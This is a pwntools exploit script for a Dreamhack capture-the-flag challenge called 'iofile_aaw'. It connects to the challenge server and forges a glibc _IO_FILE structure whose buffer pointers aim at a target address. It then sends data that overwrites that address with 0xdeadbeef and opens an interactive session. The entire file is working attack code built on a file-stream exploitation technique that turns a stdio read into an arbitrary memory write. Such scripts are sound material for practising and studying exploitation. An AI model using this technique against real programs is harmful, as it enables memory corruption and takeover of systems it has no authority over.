from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/iofile_aaw')
else:
    r = remote('host1.dreamhack.games', 9333)

overwrite_me = 0x6014a0

payload = p64(0xfbad2488)  # flag
payload += p64(0)  # _IO_read_ptr
payload += p64(0)  # _IO_read_end
payload += p64(0)  # _IO_read_base
payload += p64(0)  # _IO_write_base
payload += p64(0)  # _IO_write_ptr
payload += p64(0)  # _IO_write_end
payload += p64(overwrite_me)  # _IO_buf_base
payload += p64(overwrite_me + 0x400)  # _IO_buf_end
payload += p64(0)  # _IO_save_base
payload += p64(0)  # _IO_backup_base
payload += p64(0)  # _IO_save_end
payload += p64(0)  # _markers
payload += p64(0)  # _chain
payload += p32(0)  # _fileno

r.sendafter('Data: ', payload)
r.send(p32(0xdeadbeef).ljust(0x400, b'a'))

r.interactive()